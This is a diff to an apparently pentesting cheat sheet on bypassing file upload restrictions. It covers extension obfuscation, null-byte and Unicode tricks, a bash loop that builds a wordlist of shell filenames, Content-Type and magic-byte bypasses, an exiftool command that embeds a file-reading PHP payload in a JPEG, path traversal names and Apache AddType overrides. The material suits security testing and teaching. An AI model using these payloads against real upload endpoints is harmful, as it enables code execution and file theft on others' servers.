@@ -38,11 +38,52 @@
 
 </details>
 
+### Obfuscate Blacklisted/Whitelisted Extension&#x20;
+
+* Try following patterns by providing multiple extensions&#x20;
+  * `filename.php.jpg`, `filename.jpg.php`, `filename.php.`, `filename%2Ephp` <sup><sub>(url encode)<sub></sup>, `filename.pphphp`
+  * `filename.php.jpg`  - This works under certain conditions when the server is misconfigured. Logic would be such that code validates whether the extension is allowed type (ie `.jpg`)   but if the server config files are misconfigured the PHP code will be executed.
+* In Windows Servers, file names are case insensitive, so we may try uploading a `php` with a mixed-case (e.g. `pHp`), which may bypass the blacklist.
+* Add trailing characters (".") - > `filename.php.`
+* Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes.
+* Add semicolons <sup><sub>(windows server)<sub></sup> or URL-encoded null byte characters before the file extension. (`%00`)
+  * eg: `shell.aspx:.jpg` , `shell.php%00.jpg`
+* Try using multibyte Unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. (`xC0 x2E`, `xC4 xAE` or `xC0 xAE` translated to x2E if parsed as UTF-8 string)&#x20;
+* Use nested extensions to bypass stripping - `pphphp`&#x20;
+* Characters to use before or after final extension.
+  * `%20` , `%0a` , `%00` , `%0d0a` , `/` , `.\` , `.` , `…` , `:`&#x20;
+* ```bash
+  for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+      for ext in '.php' '.phps'; do
+          echo "shell$char$ext.jpg" >> wordlist.txt
+          echo "shell$ext$char.jpg" >> wordlist.txt
+          echo "shell.jpg$char$ext" >> wordlist.txt
+          echo "shell.jpg$ext$char" >> wordlist.txt
+      done
+  done
+  ```
+* #### Fuzzing Extensions <a href="#fuzzing-extensions" id="fuzzing-extensions"></a>
+  * **Wordlists** -  [PayloadsAllTheThings-ExtensionsPHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst), [PayloadsAllTheThings-ExtensionsASP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/extensions.lst), [SecLists-web-extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
+  * **Note**: Un-tick the `URL Encoding` option to avoid encoding the (`.`) before the file extension if fuzzing using BurpSuite.
+
 ### Content-Type Restriction Bypass
 
 * Modify `Content-Type` header to allowed file types
-* Upload any php/similar file
-* Server does not validate content-type header with the file extension or contents
+* Upload any php or similar file
+* Server does not validate content-type header with the file extension or contents.
+* In some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as `POST` data), in which case we will need to modify the main Content-Type header.
+* #### Fuzzing Content-Types
+  * **Wordlists** - [SecLists-web-all-content-types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)
+
+### MIME-Type Restriction Bypass
+
+* It is an internet standard that determines the type of a file through its general format and bytes structure.
+* File types always contain a specific sequence of bytes in their header or footer, [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
+* eg -> JPEG -> `FF D8 FF` , GIF -> `GIF87a` or `GIF89a`
+* [ExifTool](https://exiftool.org/)
+  * Create a polyglot JPEG file containing malicious code within its metadata \*
+  * `exiftool -Comment="<?php echo 'START ' . file_get_contents('<path>') . ' END'; ?>"-i <input-image> -o <output-image>`
+  * Output between START and END strings
 
 ### Path Traversal Bypass
 
@@ -50,9 +91,9 @@
 * Change the directory where files are uploaded
 * Filename contains -> `../../exploit.php` (try encoding for ../../)
 
-### Extension Blacklist Bypass&#x20;
+### Override Blacklist Extension&#x20;
 
-* Overriding server configuration (etc/apache2/apache2.conf)&#x20;
+* 1\. Overriding server configuration `/etc/apache2/apache2.conf`
 * `LoadModule php_module /usr/lib/apache2/modules/libphp.so`\
   `AddType application/x-httpd-php .php`&#x20;
 * Create special configuration file within individual directories
@@ -60,29 +101,8 @@
 * `AddType application/x-httpd-php .133t`&#x20;
 * Modify `Content-Type` to text/plain&#x20;
 * Upload a php payload with extension .133t which will be treated as `php` file.
-
-### Obfuscated File Extension&#x20;
-
-* Try following patterns by providing multiple extensions&#x20;
-  * `filename.php.jpg`, `filename.jpg.php`, `filename.php.`, `filename%2Ephp` <sup><sub>(url encode)<sub></sup>, `filename.pphphp`
-* In Windows Servers, file names are case insensitive, so we may try uploading a `php` with a mixed-case (e.g. `pHp`), which may bypass the blacklist.
-* Add trailing characters (".") - > `filename.php.`
-* Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes&#x20;
-* Add semicolons or URL-encoded null byte characters before the file extension. (`%00`)
-* Try using multibyte Unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. (`xC0 x2E`, `xC4 xAE` or `xC0 xAE` translated to x2E if parsed as UTF-8 string)&#x20;
-* Use nested extensions to bypass stripping - `pphphp`&#x20;
-* #### Fuzzing Extensions <a href="#fuzzing-extensions" id="fuzzing-extensions"></a>
-  * **Wordlists** -  [PayloadsAllTheThings-ExtensionsPHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst), [PayloadsAllTheThings-ExtensionsASP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP), [SecLists-web-extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
-  * **Note**: Un-tick the `URL Encoding` option to avoid encoding the (`.`) before the file extension if fuzzing using BurpSuite.
-
-### Flawed Validation of the File's Contents&#x20;
-
-* Certain file types may always contain a specific sequence of bytes in their header or footer&#x20;
-* eg -> JPEG files always begin with the bytes FF D8 FF&#x20;
-* [ExifTool](https://exiftool.org/)
-  * Create a polyglot JPEG file containing malicious code within its metadata \*
-  * `exiftool -Comment="<?php echo 'START ' . file_get_contents('<path>') . ' END'; ?>"-i <input-image> -o <output-image>`
-  * Output between START and END strings
+* Other server configuration locations
+  * `/etc/apache2/mods-enabled/php7.4.conf`
 
 ### Exploiting File Upload Race Conditions&#x20;
 
